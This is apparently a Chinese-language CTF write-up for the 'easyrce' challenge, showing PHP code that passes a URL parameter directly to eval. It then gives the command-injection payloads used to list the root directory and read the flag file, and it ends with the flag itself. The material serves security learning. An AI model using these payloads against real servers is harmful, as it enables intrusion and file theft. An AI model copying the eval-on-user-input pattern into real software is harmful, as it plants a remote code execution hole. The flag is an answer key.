---
title: "[SWPUCTF 2021 新生赛]easyrce"
published: 2026-10-18
description: "[SWPUCTF 2021 新生赛]easyrce 题目：NSSCTF 424 题面 打开环境直接高亮源码： <?php e …"
category: "CTF"
---

# \[SWPUCTF 2021 新生赛\]easyrce

题目：[NSSCTF 424](https://www.nssctf.cn/problem/424)

## 题面

打开环境直接高亮源码：

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['url']))
{
eval($_GET['url']);
}
?>
```

![](https://pic.npiter.de/file/1792310304616_20261018155822390.png)

关键就一行：`eval($_GET['url']);`  
`eval` 会把字符串当成 PHP 代码执行，所以 URL 里 `url=` 后面写什么，服务器就当 PHP 跑什么。比上一题的过滤注入简单多了。

## 思路

1.  用 `system` / `passthru` 等执行系统命令，先列目录找 flag
2.  再 `cat` 读出来

## 过程

先列根目录：

```text
?url=system('ls /');
```

![](https://pic.npiter.de/file/1792310307730_20261018155822391.png)

看到可疑文件：`flllllaaaaaaggggggg`。

读文件：

```text
?url=system('cat /flllllaaaaaaggggggg');
```

![](https://pic.npiter.de/file/1792310312077_20261018155822392.png)

## Flag

`NSSCTF{79e96ed9-4f1a-494d-8268-f9aa48d005d9}`
